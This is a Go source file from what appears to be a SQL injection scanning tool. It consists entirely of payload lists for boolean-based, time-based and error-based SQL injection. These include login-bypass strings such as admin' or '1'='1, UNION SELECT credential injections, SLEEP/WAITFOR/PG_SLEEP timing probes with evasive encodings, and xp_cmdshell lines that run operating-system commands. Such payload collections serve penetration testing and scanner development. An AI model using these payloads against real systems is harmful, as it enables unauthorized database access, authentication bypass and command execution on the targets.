/*
MIT License

Copyright (c) 2024 dgnnj

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

package payload

// Payloads for SQLi Boolean-based
var BooleanPayloads = []map[string]string{
	{"true": "1' AND '1'='1", "false": "1' AND '1'='2"},
	{"true": "1 AND 1=1", "false": "1 AND 1=2"},
	{"true": "' OR '1'='1", "false": "' OR '1'='0"},
	{"true": "1 OR 1=1", "false": "1 OR 1=2"},
	{"true": "\" OR \"1\"=\"1", "false": "\" OR \"1\"=\"0"},
	{"true": "1' AND '1'='1' --", "false": "1' AND '1'='0' --"},
	{"true": "'-' OR '1'='1", "false": "'-' OR '1'='0"},
	{"true": "' ' OR '1'='1", "false": "' ' OR '1'='0"},
	{"true": "'&' OR '1'='1", "false": "'&' OR '1'='0"},
	{"true": "'^' OR '1'='1", "false": "'^' OR '1'='0"},
	{"true": "'*' OR '1'='1", "false": "'*' OR '1'='0"},
	{"true": "\"-\" OR \"1\"=\"1", "false": "\"-\" OR \"1\"=\"0"},
	{"true": "\" \" OR \"1\"=\"1", "false": "\" \" OR \"1\"=\"0"},
	{"true": "\"&\" OR \"1\"=\"1", "false": "\"&\" OR \"1\"=\"0"},
	{"true": "\"^\" OR \"1\"=\"1", "false": "\"^\" OR \"1\"=\"0"},
	{"true": "\"*\" OR \"1\"=\"1", "false": "\"*\" OR \"1\"=\"0"},
	{"true": "or true--", "false": "or false--"},
	{"true": "\" or true--", "false": "\" or false--"},
	{"true": "' or true--", "false": "' or false--"},
	{"true": "\") or true--", "false": "\") or false--"},
	{"true": "') or true--", "false": "') or false--"},
	{"true": "' or 'x'='x", "false": "' or 'x'='y"},
	{"true": "') or ('x')=('x", "false": "') or ('x')=('y"},
	{"true": "')) or (('x'))=(('x", "false": "')) or (('x'))=(('y"},
	{"true": "\" or \"x\"=\"x", "false": "\" or \"x\"=\"y"},
	{"true": "\") or (\"x\")=(\"x", "false": "\") or (\"x\")=(\"y"},
	{"true": "\")) or ((\"x\"))=((\"x", "false": "\")) or ((\"x\"))=((\"y"},
	{"true": "or 1=1", "false": "or 1=2"},
	{"true": "or 1=1--", "false": "or 1=2--"},
	{"true": "or 1=1#", "false": "or 1=2#"},
	{"true": "or 1=1/*", "false": "or 1=2/*"},
	{"true": "admin' or '1'='1", "false": "admin' or '1'='2"},
	{"true": "admin' or '1'='1'--", "false": "admin' or '1'='2'--"},
	{"true": "admin' or '1'='1'#", "false": "admin' or '1'='2'#"},
	{"true": "admin' or '1'='1'/*", "false": "admin' or '1'='2'/*"},
	{"true": "admin' or 1=1 or ''='", "false": "admin' or 1=2 or ''='"},
	{"true": "admin' or 1=1", "false": "admin' or 1=2"},
	{"true": "admin' or 1=1--", "false": "admin' or 1=2--"},
	{"true": "admin' or 1=1#", "false": "admin' or 1=2#"},
	{"true": "admin' or 1=1/*", "false": "admin' or 1=2/*"},
	{"true": "admin') or ('1'='1", "false": "admin') or ('1'='2"},
	{"true": "admin') or ('1'='1'--", "false": "admin') or ('1'='2'--"},
	{"true": "admin') or ('1'='1'#", "false": "admin') or ('1'='2'#"},
	{"true": "admin') or ('1'='1'/*", "false": "admin') or ('1'='2'/*"},
	{"true": "admin') or '1'='1", "false": "admin') or '1'='2"},
	{"true": "admin') or '1'='1'--", "false": "admin') or '1'='2'--"},
	{"true": "admin') or '1'='1'#", "false": "admin') or '1'='2'#"},
	{"true": "admin') or '1'='1'/*", "false": "admin') or '1'='2'/*"},
	{"true": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "false": "1234 ' AND 1=0 UNION ALL SELECT 'user', 'password"},
	{"true": "admin\" or \"1\"=\"1", "false": "admin\" or \"1\"=\"0"},
	{"true": "admin\" or \"1\"=\"1\"--", "false": "admin\" or \"1\"=\"0\"--"},
	{"true": "admin\" or \"1\"=\"1\"#", "false": "admin\" or \"1\"=\"0\"#"},
	{"true": "admin\" or \"1\"=\"1\"/*", "false": "admin\" or \"1\"=\"0\"/*"},
	{"true": "admin\"or 1=1 or \"\"=\"", "false": "admin\"or 1=2 or \"\"=\""},
	{"true": "admin\" or 1=1", "false": "admin\" or 1=2"},
	{"true": "admin\" or 1=1--", "false": "admin\" or 1=2--"},
	{"true": "admin\" or 1=1#", "false": "admin\" or 1=2#"},
	{"true": "admin\" or 1=1/*", "false": "admin\" or 1=2/*"},
	{"true": "admin\") or (\"1\"=\"1", "false": "admin\") or (\"1\"=\"0"},
	{"true": "admin\") or (\"1\"=\"1\"--", "false": "admin\") or (\"1\"=\"0\"--"},
	{"true": "admin\") or (\"1\"=\"1\"#", "false": "admin\") or (\"1\"=\"0\"#"},
	{"true": "admin\") or (\"1\"=\"1\"/*", "false": "admin\") or (\"1\"=\"0\"/*"},
	{"true": "admin\") or \"1\"=\"1", "false": "admin\") or \"1\"=\"0"},
	{"true": "admin\") or \"1\"=\"1\"--", "false": "admin\") or \"1\"=\"0\"--"},
	{"true": "admin\") or \"1\"=\"1\"#", "false": "admin\") or \"1\"=\"0\"#"},
	{"true": "admin\") or \"1\"=\"1\"/*", "false": "admin\") or \"1\"=\"0\"/*"},
	{"true": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "false": "1234 \" AND 1=0 UNION ALL SELECT \"user\", \"password"},
}

// Payloads for SQLi Time-based
var TimePayloads = []string{

	"1 AND SLEEP([SLEEPTIME])",
	"' OR SLEEP([SLEEPTIME]) --",
	"1' AND SLEEP([SLEEPTIME]) AND '1'='1",
	"'; WAITFOR DELAY '0:0:[SLEEPTIME]' --",
	"\"; WAITFOR DELAY '0:0:[SLEEPTIME]' --",
	"1); SLEEP([SLEEPTIME]) --",
	"'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z",
	"\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR\"Z",
	"X'XOR(if(now()=sysdate(),//sleep([SLEEPTIME])//,0))XOR'X",
	"X'XOR(if(now()=sysdate(),(sleep([SLEEPTIME])),0))XOR'X",
	"X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X",
	"'XOR(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)XOR'Z",
	"(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
	"'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'",
	"1 AND (SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)-- wXyW",
	"(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))a)",
	"'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b'",
	"CASE//WHEN(LENGTH(version())=10)THEN(SLEEP([SLEEPTIME]))END",
	"');(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))--",
	"DBMS_PIPE.RECEIVE_MESSAGE([INT],[SLEEPTIME]) AND 'bar'='bar",
	"AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],[SLEEPTIME]) AND 'bar'='bar",
	"1' AND (SELECT 6268 FROM (SELECT(SLEEP([SLEEPTIME])))ghXo) AND 'IKlK'='IKlK",
	"(select*from(select(sleep([SLEEPTIME])))a)",
	"'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b'",
	"*'XOR(if(2=2,sleep([SLEEPTIME]),0))OR'",
	"-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//",
	"'+(select*from(select(if(1=1,sleep([SLEEPTIME]),false)))a)+",
	"2021 AND (SELECT 6868 FROM (SELECT(SLEEP([SLEEPTIME])))IiOE)",
	"BENCHMARK(10000000,MD5(CHAR(116)))",
	"'%2bbenchmark(10000000,sha1(1))%2b'",
	"'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep([SLEEPTIME]),1)))a)--%20 - true",
	"if(now()=sysdate(),sleep([SLEEPTIME]),0)/'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR\"/",
	"if(now()=sysdate(),sleep([SLEEPTIME]),0)/'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]) and 1=1))\"/",
	"0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z",
	"0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]*1),0))XOR'Z",
	"if(now()=sysdate(),sleep([SLEEPTIME]),0)",
	"'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'",
	"'XOR(if(now()=sysdate(),sleep([SLEEPTIME]*1),0))OR'",
	"0'|(IF((now())LIKE(sysdate()),SLEEP([SLEEPTIME]),0))|'Z",
	"(select(0)from(select(sleep([SLEEPTIME])))v)",
	"'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b'",
	"(select*from(select(sleep([SLEEPTIME])))a)",
	"1'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b'",
	",(select * from (select(sleep([SLEEPTIME])))a)",
	"desc%2c(select*from(select(sleep([SLEEPTIME])))a)",
	"-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP([SLEEPTIME]))A))",
}

// Payloads for SQLi Error-based
var ErrorPayloads = []string{
	"' OR 1=1 --", "' OR 'a'='a",
	"1' ORDER BY 1--",
	"1' GROUP BY 1--",
	"'; EXEC xp_cmdshell('dir'); --",
	"'; EXEC xp_cmdshell('whoami'); --",
	"1' UNION SELECT 1,@@version--",
	"' UNION SELECT 1,@@version--",
}
